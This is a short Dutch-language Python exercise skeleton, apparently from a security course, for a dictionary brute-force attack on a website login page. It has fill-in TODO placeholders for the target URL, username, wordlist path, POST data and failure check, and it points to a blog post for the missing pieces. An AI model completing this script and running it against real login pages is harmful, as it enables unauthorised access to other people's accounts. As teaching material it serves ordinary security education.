# Gebruik deze blog om de code af te maken: https://zsecurity.org/bruteforcing-websites-login-page-using-python/
import requests

URL  = "VUL AAN" # TODO: Op welke inlogpagina de aanval uitvoeren?
USER = "VUL AAN" # TODO: Wat is de gebruikersnaam?

with open(r"VUL AAN", "r") as fp: # TODO: pad naar woordenboek met wachtwoorden.
    wachtwoorden = [line.strip() for line in fp]

for wachtwoord in wachtwoorden:
    data = "VUL AAN" # TODO: zet data klaar om naar inlog te sturen (baseer je op de blog).
    response = requests.post(URL, data=data).text

    if "VUL AAN":    # TODO: Hoe weet je als de inlog-poging NIET gelukt is (baseer je op de blog)?
        print(f"Incorrecte Combinatie. User:{USER} Wachtwoord:{wachtwoord}.")
    else:
        print(f"Je bent binnen! Naam:{USER} Wachtwoord:{wachtwoord}")
        break